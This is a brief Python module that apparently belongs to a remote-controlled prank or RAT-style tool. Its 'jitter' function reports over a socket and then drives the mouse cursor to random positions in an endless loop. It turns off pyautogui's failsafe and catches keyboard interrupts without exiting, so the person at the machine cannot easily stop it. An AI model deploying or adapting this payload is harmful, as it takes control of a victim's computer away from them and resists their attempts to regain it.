import pyautogui as pag
import time
import random

pag.FAILSAFE = False

def jitter(sock, duration_time, sleep_time): 
    sock.sendall("Go 'Crazy'".encode())
    while True:
        try:
            x = random.randint(0, 1920)
            y = random.randint(0, 1080)
            pag.moveTo(x, y, duration=duration_time)
            time.sleep(sleep_time)
        except KeyboardInterrupt:
            sock.sendall("Stopped by user".encode())
        except Exception as e:
            sock.sendall(f"An error occurred: {e}".encode())
